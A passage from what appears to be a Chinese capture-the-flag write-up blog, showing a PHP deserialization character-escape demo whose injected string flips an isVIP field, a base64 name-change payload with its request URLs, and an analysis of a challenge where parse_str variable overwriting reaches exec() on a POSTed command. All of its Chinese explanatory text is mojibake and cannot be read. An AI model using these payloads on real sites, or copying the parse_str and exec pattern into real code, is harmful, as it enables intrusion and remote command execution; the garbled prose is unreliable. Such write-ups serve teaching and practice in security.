</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hack&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter_unseri</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a_seri_filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a_seri_filter_unseri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">object(user)#2 (3) {
</span></span><span class="line"><span class="cl">  [&#34;username&#34;]=&gt;
</span></span><span class="line"><span class="cl">  string(115) &#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:47:&#34;&#34;
</span></span><span class="line"><span class="cl">  [&#34;password&#34;]=&gt;
</span></span><span class="line"><span class="cl">  string(6) &#34;123456&#34;
</span></span><span class="line"><span class="cl">  [&#34;isVIP&#34;]=&gt;
</span></span><span class="line"><span class="cl">  int(1)
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‚è€ƒèµ„æ–™ï¼š<a class="link" href="https://baijiahao.baidu.com/s?id=1708960496312008602&amp;wfr=spider&amp;for=pc"  target="_blank" rel="noopener"
    >PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸è¯¦è§£</a></p>
<h4 id="payload-2">payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nameï¼šnew_rookie
</span></span><span class="line"><span class="cl">base64ç¼–ç ï¼šbmV3X3Jvb2tpZQ==
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">newnameï¼š
</span></span><span class="line"><span class="cl">new_rookie
</span></span><span class="line"><span class="cl">sVid
</span></span><span class="line"><span class="cl">I0
</span></span><span class="line"><span class="cl">sb.
</span></span><span class="line"><span class="cl">base64ç¼–ç ï¼šbmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg==
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/change?name=bmV3X3Jvb2tpZQ==&amp;newname=bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg==
</span></span><span class="line"><span class="cl">/dacaiji?name=new_rookie
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æ³¨æ„ï¼šnameä¸å¯ä»¥éšä¾¿ç»™ï¼Œé¢˜ç›®ç¯å¢ƒçš„nameæ˜¯new_rookie
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="repairman">repairman</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">URLï¼š
</span></span><span class="line"><span class="cl">http://cc7958e5-7762-44cc-8332-7fd11130ad36.challenge.ctf.show/index.php?mode=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">é¡µé¢å†…å®¹ï¼š
</span></span><span class="line"><span class="cl">hello,the user!We may change the mode to repaie the server,please keep it unchanged
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="é¢˜ç›®åˆ†æ-3">é¢˜ç›®åˆ†æ</h4>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œè®©mode=0ï¼Œå‘ç°å›æ˜¾äº†æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Your</span> <span class="nx">mode</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">guest</span><span class="o">!</span><span class="nx">hello</span><span class="p">,</span><span class="nx">the</span> <span class="nx">repairman</span><span class="o">!</span> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">Array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$secret</span> <span class="o">=&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$secret</span> <span class="o">=</span> <span class="k">Null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$mode</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Your mode is the guest!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">cmd</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Sucess change the ini!The logs record you!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$secret</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$secret</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//echo var_dump($GLOBALS);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$secret</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="nv">$secret</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="mi">999</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">cmd</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^a-z0-9]/is&#39;</span><span class="p">,</span> <span class="s1">&#39;hacker&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">cmd</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;hello,the repairman!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;/br&gt;hello,the user!We may change the mode to repaie the server,please keep it unchanged&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;refresh:5;url=index.php?mode=1&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>å…³é”®ä»£ç 1</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//echo var_dump($GLOBALS);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$secret</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="nv">$secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="mi">999</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">cmd</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="nx">md5</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="o">.</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^a-z0-9]/is&#39;</span><span class="p">,</span> <span class="s1">&#39;hacker&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">cmd</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;hello,the repairman!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">é€šè¿‡åˆ†æä¸Šé¢çš„ä»£ç ï¼Œå‘ç°è¦æƒ³æ‹¿åˆ°flagï¼Œè¿›å…¥adminçš„åˆ†æ”¯ï¼Œæ¥æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºteståˆ†æ”¯åªèƒ½é€šè¿‡å­—æ¯æ•°å­—æ‰§è¡Œå‘½ä»¤ï¼Œè¿™è²Œä¼¼æ˜¯ä¸å¯èƒ½çš„ã€‚å› æ­¤å°±éœ€è¦è®©$secret = md5(&#39;admin&#39;.$config[&#39;secret&#39;])ã€‚
</span></span><span class="line"><span class="cl">secretå˜é‡å®Œå…¨å¯æ§ï¼Œ
</span></span><span class="line"><span class="cl">if(isset($_COOKIE[&#39;secret&#39;])){ ... }
</span></span><span class="line"><span class="cl">å¦‚æœå­˜åœ¨åä¸º secret çš„ cookieï¼Œåˆ™å°† $_COOKIE[&#39;secret&#39;] çš„å¼•ç”¨èµ‹å€¼ç»™ $secret å˜é‡ã€‚
</span></span><span class="line"><span class="cl">åªæ˜¯$config[&#39;secret&#39;]ç›®å‰è¿˜ä¸çŸ¥é“æ€ä¹ˆèµ‹å€¼ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>å…³é”®ä»£ç 2</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$mode</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Your mode is the guest!&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$url = parse_url($_SERVER[&#39;REQUEST_URI&#39;]);
</span></span><span class="line"><span class="cl">parse_str($url[&#39;query&#39;]);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™é‡Œä¸¾ä¸ªä¾‹å­æ›´å¥½è¯´æ˜
</span></span><span class="line"><span class="cl">ä¾‹å¦‚ï¼Œç”¨æˆ·æ­£åœ¨è®¿é—®çš„ URL æ˜¯ https://example.com/path/to/page.php?param=value
</span></span><span class="line"><span class="cl">$_SERVER[&#39;REQUEST_URI&#39;] çš„å€¼æ˜¯ /path/to/page.php?param=valueã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$url = parse_url($_SERVER[&#39;REQUEST_URI&#39;]);ï¼š
</span></span><span class="line"><span class="cl">parse_url() å‡½æ•°ç”¨äºè§£æ URLï¼Œå¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå…¶ä¸­åŒ…å« URL çš„å„ä¸ªç»„æˆéƒ¨åˆ†ã€‚
</span></span><span class="line"><span class="cl">é€šè¿‡ parse_url() å‡½æ•°å¯¹$_SERVER[&#39;REQUEST_URI&#39;]è¿›è¡Œè§£æã€‚
</span></span><span class="line"><span class="cl">è§£æåçš„ç»“æœå­˜å‚¨åœ¨å˜é‡ $url ä¸­ï¼Œæ˜¯ä¸€ä¸ªå…³è”æ•°ç»„ã€‚
</span></span><span class="line"><span class="cl">$urlçš„å€¼æ˜¯
</span></span><span class="line"><span class="cl">Array (
</span></span><span class="line"><span class="cl">    [path] =&gt; /path/to/page.php
</span></span><span class="line"><span class="cl">    [query] =&gt; param1=value1&amp;param2=value2
</span></span><span class="line"><span class="cl">)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">parse_str($url[&#39;query&#39;]);
</span></span><span class="line"><span class="cl">parse_str() å‡½æ•°ç”¨äºå°†æŸ¥è¯¢å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå½“å‰ç¬¦å·è¡¨çš„æ¡ç›®ã€‚
</span></span><span class="line"><span class="cl">å…¶å¯¹ $url[&#39;query&#39;] è¿›è¡Œè§£æï¼Œå¹¶å°†è§£æåçš„å‚æ•°å’Œå€¼è®¾ç½®ä¸ºå½“å‰ç¬¦å·è¡¨ä¸­çš„å˜é‡ã€‚
</span></span><span class="line"><span class="cl">è§£æåçš„ç»“æœï¼š
</span></span><span class="line"><span class="cl">$param1 = &#39;value1&#39;;
</span></span><span class="line"><span class="cl">$param2 = &#39;value2&#39;;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ‰€ä»¥é€šè¿‡parse_urlå’Œparse_strè¿™ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼Œå¯ä»¥å¯¹$config[&#39;secret&#39;]è¿›è¡Œå˜é‡è¦†ç›–ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="çŸ¥è¯†ç‚¹-2">çŸ¥è¯†ç‚¹</h4>
<h5 id="_serverrequest_uri">$_SERVER[&lsquo;REQUEST_URI&rsquo;]</h5>
<p>$_SERVER[&lsquo;REQUEST_URI&rsquo;] æ˜¯ PHP ä¸­çš„ä¸€ä¸ªé¢„å®šä¹‰å˜é‡ï¼Œç”¨äºå­˜å‚¨å½“å‰è¯·æ±‚çš„ URIï¼ˆUniform Resource Identifierï¼‰ï¼Œå³è¯·æ±‚çš„å®Œæ•´ URL è·¯å¾„ã€‚</p>
<h5 id="urlå’Œuriçš„åŒºåˆ«">URLå’ŒURIçš„åŒºåˆ«ï¼Ÿ</h5>
<ul>
<li>
<p>URLçš„ä½œç”¨</p>
<p>URLä¸€èˆ¬æ˜¯ä¸€ä¸ªå®Œæ•´çš„é“¾æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªé“¾æ¥ï¼ˆURLï¼‰è®¿é—®åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œæˆ–è€…æŠŠè¿™ä¸ªURLå¤åˆ¶åˆ°æµè§ˆå™¨è®¿é—®ç½‘ç«™ã€‚</p>
<p>ä½¿ç”¨URLæ—¶æˆ‘ä»¬å°±æ˜¯ä¸€ä¸ªç›´æ¥ç”¨æˆ·çš„è§’è‰²ï¼Œç›´æ¥è®¿é—®å°±å¯ä»¥ã€‚</p>
</li>
<li>
<p>URIçš„ä½œç”¨</p>
